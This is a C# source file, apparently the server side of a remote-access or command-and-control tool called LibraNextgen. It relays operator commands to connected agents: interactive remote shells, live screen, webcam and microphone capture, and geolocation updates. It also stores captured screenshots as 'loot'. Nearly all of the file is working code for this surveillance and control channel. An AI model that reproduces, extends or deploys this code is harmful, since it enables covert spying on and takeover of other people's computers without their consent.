using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using LibraNextgen.Common.Models;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Hubs;

/// <summary>
/// Handles WebSocket upgrade for /ws/console and /ws/agent endpoints.
/// </summary>
public static class WebSocketHandler
{
    private const int MaxMessageSize = 4 * 1024 * 1024; // 4 MB cap to prevent memory exhaustion

    public static void Map(IEndpointRouteBuilder app)
    {
        app.Map("/ws/console", HandleConsoleWs).RequireAuthorization();
        app.Map("/ws/agent", HandleAgentWs);
    }

    /// <summary>
    /// Broadcast an agent status change to all console clients.
    /// </summary>
    private static async Task BroadcastAgentStatus(ConnectionManager wsManager, string agentId, AgentStatus status, IServiceProvider sp)
    {
        try
        {
            var agentService = sp.GetRequiredService<AgentService>();
            await agentService.UpdateStatusAsync(agentId, status);

            var msg = new WebSocketMessage
            {
                Type = "agent.status",
                Channel = agentId,
                Data = JsonSerializer.SerializeToElement(new { agentId, status = status.ToString() })
            };
            await wsManager.BroadcastToConsoleAsync(msg);
        }
        catch { /* best-effort */ }
    }

    /// <summary>
    /// Record a rejected agent response (unissued/expired requestId) to the audit log.
    /// Best-effort: a failure here must not disturb the receive loop.
    /// </summary>
    private static async Task AuditRejectedRequestAsync(HttpContext context, string agentId, string requestId)
    {
        try
        {
            var audit = context.RequestServices.GetRequiredService<AuditService>();
            await audit.LogAsync(
                userId: "system",
                userName: "system",
                action: "ws.request_id.rejected",
                actionKey: null,
                targetAgentId: agentId,
                details: $"rejected agent response with unissued requestId={requestId}",
                ipAddress: context.Connection.RemoteIpAddress?.ToString() ?? "unknown",
                success: false);
        }
        catch
        {
            // audit is best-effort
        }
    }

    private static string UnwrapAgentMessage(string agentId, string json, SessionKeyStore sessionKeys)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            if (doc.RootElement.ValueKind == JsonValueKind.Object &&
                doc.RootElement.TryGetProperty("e", out var e) &&
                e.ValueKind == JsonValueKind.String)
            {
                if (sessionKeys.TryGet(agentId, out var key) && key is not null)
                    return CryptoHelper.DecryptPayload(e.GetString()!, key);
            }
        }
        catch { /* fall through to plaintext */ }
        return json;
    }

    private static async Task HandleConsoleWs(HttpContext context)
    {
        if (!context.WebSockets.IsWebSocketRequest)
        {
            context.Response.StatusCode = 400;
            return;
        }

        var user = context.User;
        var userId = user.Identity?.Name ?? context.Connection.Id;
        var role = user.FindFirst(System.Security.Claims.ClaimTypes.Role)?.Value ?? "Operator";

        var ws = await context.WebSockets.AcceptWebSocketAsync();
        var wsManager = context.RequestServices.GetRequiredService<ConnectionManager>();
        var sessionLock = context.RequestServices.GetRequiredService<ISessionLock>();

        var connId = Guid.NewGuid().ToString("N");
        wsManager.AddConnection(connId, ws, userId, role, "console");

        // 事件溯源：回放最近事件，让新连接补齐状态。
        try
        {
            foreach (var e in wsManager.GetRecentEvents(100))
            {
                var replay = new WebSocketMessage
                {
                    Type = "event.item",
                    Channel = "global",
                    Data = JsonSerializer.SerializeToElement(e)
                };
                await wsManager.SendToConnectionAsync(connId, replay);
            }
        }
        catch { /* best-effort */ }

        try
        {
            await ConsoleReceiveLoop(ws, connId, wsManager, sessionLock, context);
        }
        finally
        {
            wsManager.RemoveConnection(connId);
        }
    }

    private static async Task ConsoleReceiveLoop(
        WebSocket ws, string connId, ConnectionManager wsManager,
        ISessionLock sessionLock, HttpContext context)
    {
        var buffer = new byte[8192];

        while (ws.State == WebSocketState.Open)
        {
            var ms = new MemoryStream();
            WebSocketReceiveResult result;
            do
            {
                result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                if (result.MessageType == WebSocketMessageType.Close) break;
                ms.Write(buffer, 0, result.Count);
            } while (!result.EndOfMessage);

            if (ms.Length > MaxMessageSize)
            {
                await ws.CloseAsync(WebSocketCloseStatus.MessageTooBig, "message too big", CancellationToken.None);
                break;
            }

            if (result.MessageType == WebSocketMessageType.Close)
            {
                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "closed", CancellationToken.None);
                break;
            }

            if (result.MessageType == WebSocketMessageType.Text)
            {
                var json = Encoding.UTF8.GetString(ms.GetBuffer(), 0, (int)ms.Length);
                var message = WebSocketMessage.FromJson(json);
                if (message == null) continue;

                await HandleConsoleMessage(message, connId, wsManager, sessionLock, context);
            }
        }
    }

    private static async Task HandleConsoleMessage(
        WebSocketMessage message, string connId, ConnectionManager wsManager,
        ISessionLock sessionLock, HttpContext context)
    {
        switch (message.Type)
        {
            case "shell.bind":
                var agentId = message.Data?.GetProperty("agentId").GetString();
                if (agentId == null) break;

                wsManager.BindToAgent(connId, agentId);
                wsManager.AppendEvent("shell", $"操作员 {wsManager.GetUserId(connId)} 绑定 {agentId} 的 Shell");

                var acquired = sessionLock.TryAcquireWriteLock(agentId, wsManager.GetUserId(connId), out var writerId);
                var lockMsg = new WebSocketMessage
                {
                    Type = acquired ? WsMessageType.ShellLockAcquired : WsMessageType.ShellObserverJoined,
                    Channel = agentId,
                    Data = JsonSerializer.SerializeToElement(new
                    {
                        writerId = writerId,
                        mode = acquired ? "write" : "readonly"
                    })
                };
                await wsManager.SendToConnectionAsync(connId, lockMsg);

                // Forward to agent so it starts a PTY shell
                await wsManager.RelayToAgentAsync(agentId, message);
                break;

            case "shell.unbind":
                var unbindAgentId = message.Data?.GetProperty("agentId").GetString();
                if (unbindAgentId != null)
                {
                    var unbindUserId = wsManager.GetUserId(connId);
                    sessionLock.ReleaseWriteLock(unbindAgentId, unbindUserId);
                    sessionLock.RemoveObserver(unbindAgentId, unbindUserId);
                    wsManager.BindToAgent(connId, null!);

                    // Forward to agent so it kills the PTY
                    await wsManager.RelayToAgentAsync(unbindAgentId, message);
                }
                break;

            case "shell.input":
                var inputAgentId = message.Channel;
                if (!string.IsNullOrEmpty(inputAgentId))
                {
                    await wsManager.RelayToAgentShellAsync(inputAgentId, connId, message);
                }
                break;

            case "screen.list":
                var slAgentId = message.Channel;
                if (string.IsNullOrEmpty(slAgentId))
                {
                    try { slAgentId = message.Data?.GetProperty("agentId").GetString(); } catch { }
                }
                if (!string.IsNullOrEmpty(slAgentId))
                {
                    wsManager.BindToAgent(connId, slAgentId);
                    await wsManager.RelayToAgentAsync(slAgentId, message);
                }
                break;

            case "screen.bind":
            case "camera.bind":
            case "mic.bind":
                var bindAgentId = message.Channel;
                if (string.IsNullOrEmpty(bindAgentId))
                {
                    try { bindAgentId = message.Data?.GetProperty("agentId").GetString(); } catch { }
                }
                if (!string.IsNullOrEmpty(bindAgentId))
                {
                    wsManager.BindToAgent(connId, bindAgentId);
                    await wsManager.RelayToAgentAsync(bindAgentId, message);
                }
                break;

            case "screen.unbind":
            case "camera.unbind":
            case "mic.unbind":
                var ubAgentId = message.Channel;
                if (string.IsNullOrEmpty(ubAgentId))
                {
                    try { ubAgentId = message.Data?.GetProperty("agentId").GetString(); } catch { }
                }
                if (!string.IsNullOrEmpty(ubAgentId))
                {
                    wsManager.BindToAgent(connId, null!);
                    await wsManager.RelayToAgentAsync(ubAgentId, message);
                }
                break;

            case "screen.config":
            case "camera.config":
                var cfgAgentId = message.Channel;
                if (string.IsNullOrEmpty(cfgAgentId))
                {
                    try { cfgAgentId = message.Data?.GetProperty("agentId").GetString(); } catch { }
                }
                if (!string.IsNullOrEmpty(cfgAgentId))
                {
                    await wsManager.RelayToAgentAsync(cfgAgentId, message);
                }
                break;

            default:
                await wsManager.BroadcastToConsoleAsync(message);
                break;
        }
    }

    private static async Task HandleAgentWs(HttpContext context)
    {
        if (!context.WebSockets.IsWebSocketRequest)
        {
            context.Response.StatusCode = 400;
            return;
        }

        var agentId = context.Request.Query["agentId"].FirstOrDefault() ?? "unknown";
        var ws = await context.WebSockets.AcceptWebSocketAsync();
        var wsManager = context.RequestServices.GetRequiredService<ConnectionManager>();
        var traffic = context.RequestServices.GetRequiredService<AgentTrafficService>();
        var sessionKeys = context.RequestServices.GetRequiredService<SessionKeyStore>();
        var connId = Guid.NewGuid().ToString("N");
        wsManager.AddConnection(connId, ws, agentId, "agent", "agent");
        wsManager.BindToAgent(connId, agentId);

        var buffer = new byte[8192];
        try
        {
            while (ws.State == WebSocketState.Open)
            {
                var ms = new MemoryStream();
                WebSocketReceiveResult result;
                do
                {
                    result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    if (result.MessageType == WebSocketMessageType.Close) break;
                    ms.Write(buffer, 0, result.Count);
                } while (!result.EndOfMessage);

                if (ms.Length > MaxMessageSize)
                {
                    await TryCloseAsync(ws, WebSocketCloseStatus.MessageTooBig, "message too big");
                    break;
                }

                if (result.MessageType == WebSocketMessageType.Close)
                {
                    await TryCloseAsync(ws, WebSocketCloseStatus.NormalClosure, "closed");
                    break;
                }

                if (result.MessageType == WebSocketMessageType.Text)
                {
                    traffic.Accumulate(agentId, "unknown", ms.Length, 0);

                    var json = Encoding.UTF8.GetString(ms.GetBuffer(), 0, (int)ms.Length);
                    json = UnwrapAgentMessage(agentId, json, sessionKeys);
                    var message = WebSocketMessage.FromJson(json);
                    if (message == null) continue;

                    message.Channel = agentId;

                    // A non-null requestId marks a REST-relayed response. Only an
                    // issued (pending) requestId may complete; forged or stale ids are
                    // dropped and audited instead of being routed as normal traffic.
                    if (message.RequestId != null)
                    {
                        if (wsManager.CompletePendingRequest(message.RequestId, message))
                        {
                            continue;
                        }
                        await AuditRejectedRequestAsync(context, agentId, message.RequestId);
                        continue;
                    }

                    // Handle agent geo update
                    if (message.Type == "agent.geo.update")
                    {
                        try
                        {
                            var agentService = context.RequestServices.GetRequiredService<AgentService>();
                            var geo = message.Data?.Deserialize<LibraNextgen.Common.Models.GeoInfo>();
                            if (geo != null)
                                await agentService.UpdateGeoAsync(agentId, geo);
                        }
                        catch { /* best-effort */ }
                        continue;
                    }

                    if (message.Type == "screen.frame")
                    {
                        ScreenStreamManager.TryPushFrame(agentId, json);

                        // Loot：完整帧落库（LootService 内部节流，best-effort）
                        try
                        {
                            var loot = context.RequestServices.GetRequiredService<LootService>();
                            var jpeg = message.Data?.GetProperty("jpeg").GetString();
                            if (!string.IsNullOrEmpty(jpeg))
                                _ = loot.SaveScreenshotAsync(agentId, jpeg);
                        }
                        catch { /* best-effort */ }
                    }
                    else if (message.Type is "screen.diff" or "screen.error")
                    {
                        ScreenStreamManager.TryPushFrame(agentId, json);
                    }
                    else if (message.Type is "camera.frame" or "camera.error")
                    {
                        ScreenStreamManager.TryPushFrame($"camera:{agentId}", json);
                    }
                    else if (message.Type is "mic.data" or "mic.error")
                    {
                        ScreenStreamManager.TryPushFrame($"mic:{agentId}", json);
                    }
                    else
                    {
                        await wsManager.BroadcastShellOutputAsync(agentId, message);
                    }
                }
            }
        }
        finally
        {
            wsManager.RemoveConnection(connId);
            _ = traffic.FlushAsync();
            // Mark agent offline if no WS connection remains (only the agent has reconnection, not the server)
            if (!wsManager.IsAgentConnected(agentId))
            {
                _ = BroadcastAgentStatus(wsManager, agentId, AgentStatus.Offline, context.RequestServices);
            }
        }
    }

    /// Close the agent WebSocket tolerantly: the peer may already be gone
    /// (abrupt TCP drop) which makes CloseAsync throw a WebSocketException.
    private static async Task TryCloseAsync(System.Net.WebSockets.WebSocket ws, WebSocketCloseStatus status, string reason)
    {
        try
        {
            if (ws.State == WebSocketState.Open || ws.State == WebSocketState.CloseReceived)
                await ws.CloseAsync(status, reason, CancellationToken.None);
        }
        catch (System.Net.WebSockets.WebSocketException)
        {
            // Peer vanished without completing the close handshake — ignore.
        }
        catch (ObjectDisposedException)
        {
            // Socket already torn down — ignore.
        }
    }
}
